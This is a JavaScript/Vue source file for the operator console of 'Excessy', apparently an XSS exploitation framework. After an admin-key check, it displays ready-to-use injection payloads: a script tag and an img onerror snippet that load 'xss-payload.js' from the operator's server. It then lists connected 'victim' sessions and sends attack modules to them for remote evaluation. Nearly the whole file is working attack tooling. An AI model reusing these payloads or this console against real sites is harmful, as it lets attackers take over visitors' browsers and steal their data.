let communicationChannel = null;
let adminFunctions = null;

// Load admin functions dynamically
(async () => {
    try {
        adminFunctions = await import('./dist/admin-client.js');
        console.log('Admin client loaded successfully');
    } catch (error) {
        console.error('Failed to load admin client:', error);
    }
})();

// Admin Key Screen Component
Vue.component('admin-key-screen', {
    template: `
        <div>
            <p>Hello and welcome to Excessy! Before we move forward, please input your admin key below.</p>
            <form @submit="submit">
                <input style="width: 420px" v-model="adminKey" @keydown="errorMsg = ''" placeholder="Enter admin key here" autofocus>
                <button>Go!</button>
            </form>
            <div class="error" v-if="errorMsg !== ''">{{ errorMsg }}</div>
        </div>
    `,
    data() {
        return {
            adminKey: '',
            errorMsg: ''
        }
    },
    methods: {
        async submit(ev) {
            ev.preventDefault();
            
            if (!adminFunctions) {
                this.errorMsg = 'Admin client not loaded yet.';
                return;
            }
            
            try {
                const response = await adminFunctions.checkAdminKey(this.adminKey);
                if (response.status === 'ok') {
                    localStorage.setItem('adminKey', this.adminKey);
                    app.$emit('change-state', 'admin-key-set');
                } else {
                    this.errorMsg = 'Invalid admin key.';
                }
            } catch (error) {
                this.errorMsg = 'Connection error.';
            }
        }
    }
});

// Await Connection Screen Component
Vue.component('await-for-connection-screen', {
    template: `
        <div>
            <p>
                Please use the following script in the XSS. It will make sure that the victim
                will connect to Excessy server.
            </p>
            <p style="padding-left: 60px; background: lightgray">
                &lt;script src="{{ scriptUrl }}">&lt;/script>
            </p>
            <p> ... or ...</p>
            <p style="padding-left: 60px; background: lightgray;overflow-wrap:break-word">
                &lt;img src onerror="sc=document.createElement('script');sc.src='{{scriptUrl}}';document.head.appendChild(sc);"&gt;
            </p>
            <p>
                You can connect to these sessions:
            </p>
            <ul>
                <li style="cursor: pointer" @click="setSession(session)" v-for="session in sessions">
                    id: {{ session.id }}, origin: {{ session.origin }}
                </li>
            </ul>
        </div>
    `,
    data() {
        return {
            scriptUrl: location.origin + '/dist/xss-payload.js',
            sessions: []
        };
    },
    mounted() {
        const adminKey = localStorage.getItem('adminKey');
        if (adminKey) {
            communicationChannel = initializeWebSocket(adminKey);
            communicationChannel.sessionsCallback = (sessions) => {
                this.sessions = sessions;
            };
        }
    },
    methods: {
        setSession(session) {
            if (communicationChannel) {
                communicationChannel.joinSession(session.id);
                app.$emit('change-state', 'victim-connected');
            }
        }
    }
});

// Main App Component
Vue.component('main-app', {
    template: `
        <div>
            <h1># Modules</h1>
            <div id="modules-list" style="text-transform: lowercase">
                |
                <span v-for="module in modules">
                    <span :style="{ fontWeight: (selectedModule.name === module.name ? 'bold' : ''), cursor: 'pointer' }"  @click="selectModule(module)">
                        {{ module.name }}
                    </span> |
                </span>
            </div>
            <h1 style="text-transform: uppercase">
                # {{ selectedModule.name }}
            </h1>
            <p>{{ selectedModule.description }}</p>
            <h3>## Execute Module</h3>
            <button @click="execute" :disabled="!selectedModule.name">Execute {{ selectedModule.name }}</button>
            <h3>## Log</h3>
            <ul>
                <li v-for="entry of reversedLog">
                    [{{ entry.date.toLocaleString() }}]
                    <span v-if="entry.type !== 'html'"> {{ entry.text }} </span>
                    <span v-else v-html="entry.text"></span>
                </li>
            </ul>
        </div>
    `,
    data() {
        return {
            modules: [],
            selectedModule: { name: '', description: '' },
            log: [],
            loadedModules: new Map()
        }
    },
    computed: {
        reversedLog() {
            return this.log.slice().reverse();
        }
    },
    async mounted() {
        try {
            const moduleNames = await loadModules();
            this.modules = moduleNames.map(name => ({ 
                name: name.replace('-', ' ').replace(/\b\w/g, l => l.toUpperCase()),
                fileName: name,
                description: `Execute ${name} module`
            }));
            
            if (this.modules.length > 0) {
                this.selectModule(this.modules[0]);
            }
        } catch (error) {
            this.addLogEntry('Failed to load modules: ' + error.message, 'error');
        }
    },
    methods: {
        async execute() {
            if (!this.selectedModule.fileName || !communicationChannel) {
                this.addLogEntry('No module selected or no connection', 'error');
                return;
            }

            try {
                let module = this.loadedModules.get(this.selectedModule.fileName);
                if (!module) {
                    module = await loadModule(this.selectedModule.fileName);
                    if (module) {
                        this.loadedModules.set(this.selectedModule.fileName, module);
                    } else {
                        this.addLogEntry('Failed to load module', 'error');
                        return;
                    }
                }

                const executeCode = module.execute.toString();
                const callback = (data) => {
                    module.handleResult(this.addLogEntry.bind(this), data);
                };

                communicationChannel.sendEval(executeCode, callback);
                this.addLogEntry(`${this.selectedModule.name} payload sent.`);
                
            } catch (error) {
                this.addLogEntry('Execution error: ' + error.message, 'error');
            }
        },
        selectModule(module) {
            this.selectedModule = module;
        },
        addLogEntry(text, type = 'text') {
            this.log.push({
                text,
                type,
                date: new Date()
            });
        }
    }
});

// Vue App Instance
const app = new Vue({
    el: '#app',
    data: {
        state: 'admin-key'
    },
    created() {
        this.$on('change-state', transition => {
            if (this.state === 'admin-key' && transition === 'admin-key-set') {
                this.state = 'await-for-connection';
            } else if (this.state === 'await-for-connection' && transition === 'victim-connected') {
                this.state = 'main-app';
            }
        });

        // Check if admin key exists
        const savedAdminKey = localStorage.getItem('adminKey');
        if (savedAdminKey) {
            checkAdminKey(savedAdminKey).then(response => {
                if (response.status === 'ok') {
                    this.state = 'await-for-connection';
                }
            }).catch(() => {
                localStorage.removeItem('adminKey');
            });
        }
    }
});